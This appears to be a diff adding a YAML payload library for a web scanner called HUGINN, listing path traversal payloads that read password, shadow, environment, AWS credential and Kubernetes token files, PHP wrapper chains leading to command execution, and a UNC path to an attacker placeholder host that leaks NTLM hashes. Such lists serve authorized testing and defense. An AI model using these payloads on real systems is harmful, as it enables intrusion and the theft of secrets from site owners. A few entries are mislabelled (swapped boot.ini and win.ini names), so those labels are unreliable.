@@ -1,0 +1,447 @@
+# =============================================================================
+#  HUGINN :: payloads/path_traversal.yaml
+#  Path Traversal / Directory Traversal Arsenal — 2026 Edition
+# -----------------------------------------------------------------------------
+#  Placeholders:
+#    {{TARGET_FILE}} → default /etc/passwd (Linux) — overridable per scan
+#
+#  Categories:
+#    - basic           : plain ../ sequences
+#    - backslash       : Windows-style ..\
+#    - encoded         : URL, double-URL, hex, octal
+#    - unicode         : fullwidth, overlong UTF-8
+#    - dot_tricks      : ....//, ..;/ and parser-normalisation bypasses
+#    - absolute        : absolute paths to known files
+#    - wrappers        : php://, file://, expect://, zip://
+#    - modern          : 2025/2026 parser-differential research
+# =============================================================================
+
+meta:
+  name: "HUGINN Path Traversal Arsenal"
+  version: "1.0.0"
+  description: >
+    Comprehensive path traversal payload set spanning classic ../ sequences
+    through 2025/2026 parser-normalisation bypasses. Detection is based on
+    content markers (/etc/passwd patterns, Windows ini headers) and response
+    status changes.
+  attacker_placeholder: "{{ATTACKER}}"
+  references:
+    - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal"
+    - "https://owasp.org/www-community/attacks/Path_Traversal"
+    - "https://portswigger.net/web-security/file-path-traversal"
+  last_updated: "2026-09-13"
+
+payloads:
+
+  # ---------------------------------------------------------------------------
+  #  1. BASIC
+  # ---------------------------------------------------------------------------
+  - id: "pt-basic-001"
+    name: "Single ../"
+    category: "basic"
+    payload: "../"
+    description: "Single directory up — baseline test."
+    tags: ["basic"]
+    severity_hint: "medium"
+
+  - id: "pt-basic-002"
+    name: "Deep ../ traversal"
+    category: "basic"
+    payload: "../../../../../../etc/passwd"
+    description: "Traverse out of the webroot on Linux."
+    tags: ["basic", "linux"]
+    detection: "'root:x:0:0' in response"
+    severity_hint: "high"
+
+  - id: "pt-basic-003"
+    name: "Linux /etc/passwd"
+    category: "basic"
+    payload: "../../../etc/passwd"
+    description: "Classic Linux file disclosure target."
+    tags: ["basic", "linux"]
+    detection: "'root:x:0:0' in response"
+    severity_hint: "high"
+
+  - id: "pt-basic-004"
+    name: "Linux /etc/shadow"
+    category: "basic"
+    payload: "../../../../../../etc/shadow"
+    description: "Password hashes — rarely readable but worth trying."
+    tags: ["basic", "linux", "critical"]
+    detection: "colons and $ hash markers in response"
+    severity_hint: "critical"
+
+  - id: "pt-basic-005"
+    name: "Proc environment"
+    category: "basic"
+    payload: "../../../../../../proc/self/environ"
+    description: "Process environment — frequently contains secrets."
+    tags: ["basic", "linux", "secrets"]
+    detection: "NUL-separated KEY=VALUE pairs"
+    severity_hint: "critical"
+
+  - id: "pt-basic-006"
+    name: "Proc command line"
+    category: "basic"
+    payload: "../../../../../../proc/self/cmdline"
+    description: "Process argv — reveals the launch command."
+    tags: ["basic", "linux"]
+    severity_hint: "medium"
+
+  - id: "pt-basic-007"
+    name: "Windows boot.ini"
+    category: "basic"
+    payload: "..\\..\\..\\..\\windows\\win.ini"
+    description: "Windows file disclosure."
+    tags: ["basic", "windows"]
+    detection: "'[extensions]' or '[fonts]' in response"
+    severity_hint: "high"
+
+  - id: "pt-basic-008"
+    name: "Windows win.ini"
+    category: "basic"
+    payload: "..\\..\\..\\..\\windows\\boot.ini"
+    description: "Windows boot.ini."
+    tags: ["basic", "windows"]
+    severity_hint: "high"
+
+  # ---------------------------------------------------------------------------
+  #  2. ENCODED
+  # ---------------------------------------------------------------------------
+  - id: "pt-enc-001"
+    name: "URL-encoded dot-dot-slash"
+    category: "encoded"
+    payload: "..%2f..%2f..%2fetc%2fpasswd"
+    description: "Encoded slashes — bypasses naive ../ filters."
+    tags: ["encoded", "url"]
+    detection: "'root:x:0:0' in response"
+    severity_hint: "high"
+
+  - id: "pt-enc-002"
+    name: "Double URL-encoded"
+    category: "encoded"
+    payload: "..%252f..%252f..%252fetc%252fpasswd"
+    description: "Double encoding — bypasses single-decode WAFs."
+    tags: ["encoded", "double-url"]
+    detection: "'root:x:0:0' in response"
+    severity_hint: "high"
+
+  - id: "pt-enc-003"
+    name: "Only dots encoded"
+    category: "encoded"
+    payload: "%2e%2e/%2e%2e/etc/passwd"
+    description: "Encode the dots, leave slashes literal."
+    tags: ["encoded"]
+    severity_hint: "high"
+
+  - id: "pt-enc-004"
+    name: "Only slashes encoded"
+    category: "encoded"
+    payload: "../..%2f..%2fetc/passwd"
+    description: "Encode the slashes, leave dots literal."
+    tags: ["encoded"]
+    severity_hint: "high"
+
+  - id: "pt-enc-005"
+    name: "Backslash-encoded"
+    category: "encoded"
+    payload: "..%5c..%5c..%5cwindows%5cwin.ini"
+    description: "URL-encoded backslash — Windows parser."
+    tags: ["encoded", "windows"]
+    severity_hint: "high"
+
+  - id: "pt-enc-006"
+    name: "16-bit Unicode encoding"
+    category: "encoded"
+    payload: "..%u2215..%u2215etc/passwd"
+    description: "IIS %u encoding — legacy but occasionally live."
+    tags: ["encoded", "unicode", "iis"]
+    severity_hint: "medium"
+
+  - id: "pt-enc-007"
+    name: "Overlong UTF-8 dot"
+    category: "encoded"
+    payload: "..%c0%ae..%c0%ae/etc/passwd"
+    description: "Overlong UTF-8 encoding of dot — legacy IIS."
+    tags: ["encoded", "overlong-utf8"]
+    severity_hint: "medium"
+
+  - id: "pt-enc-008"
+    name: "Overlong UTF-8 slash"
+    category: "encoded"
+    payload: "..%c0%af..%c0%afetc/passwd"
+    description: "Overlong encoding of slash."
+    tags: ["encoded", "overlong-utf8"]
+    severity_hint: "medium"
+
+  # ---------------------------------------------------------------------------
+  #  3. UNICODE
+  # ---------------------------------------------------------------------------
+  - id: "pt-uni-001"
+    name: "Fullwidth solidus"
+    category: "unicode"
+    payload: "..／..／etc／passwd"
+    description: "U+FF0F — NFKC normalises to forward slash."
+    tags: ["unicode", "nfkc"]
+    severity_hint: "medium"
+
+  - id: "pt-uni-002"
+    name: "Fullwidth reverse solidus"
+    category: "unicode"
+    payload: "..＼..＼windows＼win.ini"
+    description: "U+FF3C — NFKC to backslash."
+    tags: ["unicode", "nfkc"]
+    severity_hint: "medium"
+
+  - id: "pt-uni-003"
+    name: "Fullwidth dot"
+    category: "unicode"
+    payload: "．．／．．／etc/passwd"
+    description: "U+FF0E — NFKC to dot."
+    tags: ["unicode", "nfkc"]
+    severity_hint: "medium"
+
+  - id: "pt-uni-004"
+    name: "Dot operator"
+    category: "unicode"
+    payload: "..∕..∕etc∕passwd"
+    description: "U+2215 division slash."
+    tags: ["unicode"]
+    severity_hint: "medium"
+
+  - id: "pt-uni-005"
+    name: "Fraction slash"
+    category: "unicode"
+    payload: "..⁄..⁄etc⁄passwd"
+    description: "U+2044 fraction slash."
+    tags: ["unicode"]
+    severity_hint: "medium"
+
+  # ---------------------------------------------------------------------------
+  #  4. DOT TRICKS — bypass filters that strip ../ once
+  # ---------------------------------------------------------------------------
+  - id: "pt-dot-001"
+    name: "Quad-dot slash"
+    category: "dot_tricks"
+    payload: "....//....//....//etc/passwd"
+    description: "Filter strips ../ once, leaves ../ behind."
+    tags: ["dot_tricks", "bypass"]
+    severity_hint: "high"
+
+  - id: "pt-dot-002"
+    name: "Quad-dot backslash"
+    category: "dot_tricks"
+    payload: "....\\\\....\\\\windows\\\\win.ini"
+    description: "Windows variant of double-strip bypass."
+    tags: ["dot_tricks", "windows"]
+    severity_hint: "high"
+
+  - id: "pt-dot-003"
+    name: "Triple-dot slash"
+    category: "dot_tricks"
+    payload: "..././..././..././etc/passwd"
+    description: "Misplaced dot after slash."
+    tags: ["dot_tricks"]
+    severity_hint: "high"
+
+  - id: "pt-dot-004"
+    name: "Semicolon path parameter"
+    category: "dot_tricks"
+    payload: "..;/..;/..;/etc/passwd"
+    description: "Tomcat/Spring path-parameter bypass."
+    tags: ["dot_tricks", "java"]
+    severity_hint: "high"
+
+  - id: "pt-dot-005"
+    name: "Dot-slash-dot-slash"
+    category: "dot_tricks"
+    payload: "./././././././etc/passwd"
+    description: "Repeated dot-slash normalisation bypass."
+    tags: ["dot_tricks"]
+    severity_hint: "medium"
+
+  - id: "pt-dot-006"
+    name: "Trailing dots (Windows)"
+    category: "dot_tricks"
+    payload: "..\\..\\..\\windows\\win.ini."
+    description: "Windows trailing-dot stripping quirk."
+    tags: ["dot_tricks", "windows"]
+    severity_hint: "medium"
+
+  - id: "pt-dot-007"
+    name: "Encoded null byte"
+    category: "dot_tricks"
+    payload: "../../../../etc/passwd%00.png"
+    description: "Null byte truncates the check."
+    tags: ["dot_tricks", "null-byte", "legacy"]
+    severity_hint: "medium"
+
+  - id: "pt-dot-008"
+    name: "Alternating slashes"
+    category: "dot_tricks"
+    payload: "..\\/..\\/..\\/etc/passwd"
+    description: "Mixed slash direction — parser differential."
+    tags: ["dot_tricks"]
+    severity_hint: "high"
+
+  # ---------------------------------------------------------------------------
+  #  5. ABSOLUTE
+  # ---------------------------------------------------------------------------
+  - id: "pt-abs-001"
+    name: "Absolute /etc/passwd"
+    category: "absolute"
+    payload: "/etc/passwd"
+    description: "Direct absolute path — some apps pass to file() unchecked."
+    tags: ["absolute", "linux"]
+    detection: "'root:x:0:0' in response"
+    severity_hint: "high"
+
+  - id: "pt-abs-002"
+    name: "Absolute Windows ini"
+    category: "absolute"
+    payload: "C:\\Windows\\win.ini"
+    description: "Direct Windows path."
+    tags: ["absolute", "windows"]
+    severity_hint: "high"
+
+  - id: "pt-abs-003"
+    name: "Double-slash absolute"
+    category: "absolute"
+    payload: "//etc/passwd"
+    description: "Some parsers normalise // as absolute."
+    tags: ["absolute"]
+    severity_hint: "medium"
+
+  - id: "pt-abs-004"
+    name: "Triple-slash absolute"
+    category: "absolute"
+    payload: "///etc/passwd"
+    description: "Some parsers collapse /// to /."
+    tags: ["absolute"]
+    severity_hint: "medium"
+
+  - id: "pt-abs-005"
+    name: "UNC path (Windows)"
+    category: "absolute"
+    payload: "\\\\{{ATTACKER}}\\share\\file"
+    description: "UNC path triggers SMB — leaks NTLM hashes."
+    tags: ["absolute", "windows", "ntlm"]
+    severity_hint: "high"
+
+  # ---------------------------------------------------------------------------
+  #  6. WRAPPERS
+  # ---------------------------------------------------------------------------
+  - id: "pt-wrap-001"
+    name: "php://filter base64"
+    category: "wrappers"
+    payload: "php://filter/convert.base64-encode/resource=index.php"
+    description: "PHP stream wrapper — reads and base64-encodes source."
+    tags: ["wrappers", "php"]
+    detection: "Long base64 blob in response"
+    severity_hint: "critical"
+
+  - id: "pt-wrap-002"
+    name: "php://filter chain"
+    category: "wrappers"
+    payload: "php://filter/convert.iconv.UTF8.UTF16/resource=index.php"
+    description: "Iconv filter chain — bypasses basic filter checks."
+    tags: ["wrappers", "php"]
+    severity_hint: "critical"
+
+  - id: "pt-wrap-003"
+    name: "php://input"
+    category: "wrappers"
+    payload: "php://input"
+    description: "Reads POST body — chains with LFI to RCE."
+    tags: ["wrappers", "php"]
+    severity_hint: "critical"
+
+  - id: "pt-wrap-004"
+    name: "data:// text plain"
+    category: "wrappers"
+    payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
+    description: "Data wrapper — chains to RCE if include() is used."
+    tags: ["wrappers", "php", "rce"]
+    severity_hint: "critical"
+
+  - id: "pt-wrap-005"
+    name: "expect:// command"
+    category: "wrappers"
+    payload: "expect://id"
+    description: "Expect wrapper runs shell commands (if installed)."
+    tags: ["wrappers", "php", "rce"]
+    detection: "uid= output in response"
+    severity_hint: "critical"
+
+  # ---------------------------------------------------------------------------
+  #  7. MODERN (2025 / 2026)
+  # ---------------------------------------------------------------------------
+  - id: "pt-modern-001"
+    name: "Truncation via backslash (Windows)"
+    category: "modern"
+    payload: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    description: "Windows path with backslash — modern parser differential."
+    tags: ["modern", "windows", "2026"]
+    severity_hint: "high"
+
+  - id: "pt-modern-002"
+    name: "URL-encoded backslash path"
+    category: "modern"
+    payload: "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+    description: "Encoded backslash — hits Windows API even when the OS is Linux (via SMB lookup)."
+    tags: ["modern", "windows", "ntlm", "2026"]
+    severity_hint: "high"
+
+  - id: "pt-modern-003"
+    name: "PHP stream chain"
+    category: "modern"
+    payload: "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=/etc/passwd"
+    description: "Multi-filter PHP chain — bypasses simple wrapper filters."
+    tags: ["modern", "php", "2025"]
+    severity_hint: "critical"
+
+  - id: "pt-modern-004"
+    name: "Docker path traversal"
+    category: "modern"
+    payload: "..%2f..%2f..%2fvar/run/docker.sock"
+    description: "Reads Docker socket via path traversal — chains to RCE."
+    tags: ["modern", "docker", "2025"]
+    severity_hint: "critical"
+
+  - id: "pt-modern-005"
+    name: "Kubernetes SA token"
+    category: "modern"
+    payload: "../../../../var/run/secrets/kubernetes.io/serviceaccount/token"
+    description: "Reads Kubernetes service account token."
+    tags: ["modern", "kubernetes", "2025"]
+    detection: "eyJ... JWT in response"
+    severity_hint: "critical"
+
+  - id: "pt-modern-006"
+    name: "AWS credentials file"
+    category: "modern"
+    payload: "../../../../home/user/.aws/credentials"
+    description: "Reads AWS credentials file."
+    tags: ["modern", "aws", "2025"]
+    detection: "aws_access_key_id in response"
+    severity_hint: "critical"
+
+  - id: "pt-modern-007"
+    name: "Linux double-encoded traversal"
+    category: "modern"
+    payload: "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    description: "Full-path double encoding."
+    tags: ["modern", "encoding", "2026"]
+    severity_hint: "high"
+
+  - id: "pt-modern-008"
+    name: "Java /WEB-INF via traversal"
+    category: "modern"
+    payload: "..;/..;/..;/WEB-INF/web.xml"
+    description: "Spring Boot path-parameter trick to reach WEB-INF."
+    tags: ["modern", "java", "spring", "2026"]
+    severity_hint: "critical"
+
+# =============================================================================
+#  END
+# =============================================================================
